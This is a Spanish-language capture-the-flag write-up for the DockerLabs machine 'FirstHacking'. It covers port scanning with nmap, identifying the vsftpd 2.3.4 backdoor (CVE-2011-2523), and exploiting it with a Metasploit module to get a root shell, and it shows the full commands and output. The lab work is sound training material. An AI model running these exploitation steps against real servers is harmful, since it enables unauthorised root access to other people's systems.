# Write-up: FirstHacking (DockerLabs)

Resolución completa de la máquina **FirstHacking** de DockerLabs - Dificultad: Muy Fácil

## 1. Reconocimiento

### Escaneo de Puertos
```bash
nmap -sC -sV -p- 172.17.0.2
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

Solo encontramos el puerto 21 abierto ejecutando **vsftpd 2.3.4**.

## 2. Análisis de Vulnerabilidades

La versión **vsftpd 2.3.4** es conocida por contener una puerta trasera (backdoor) que permite ejecución remota de comandos como root.

- **CVE**: CVE-2011-2523
- **Descripción**: Backdoor en vsftpd 2.3.4
- **Impacto**: Acceso root directo

## 3. Explotación

### Usando Metasploit
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
exploit
```

**Resultado:**
```
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Command shell session 1 opened
```

¡Shell obtenida como **root**!

### Verificación
```bash
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

## 4. Conclusión

La máquina **FirstHacking** es un excelente punto de partida para aprender sobre:
- Enumeración de servicios
- Búsqueda de vulnerabilidades conocidas
- Uso de Metasploit Framework
- Explotación de backdoors

**Puntos clave:**
- ✅ Reconocimiento exhaustivo de puertos
- ✅ Identificación de versiones vulnerables
- ✅ Uso de exploits públicos (Metasploit)
- ✅ Acceso root directo sin escalada de privilegios necesaria

---
*Write-up por Antigravity*
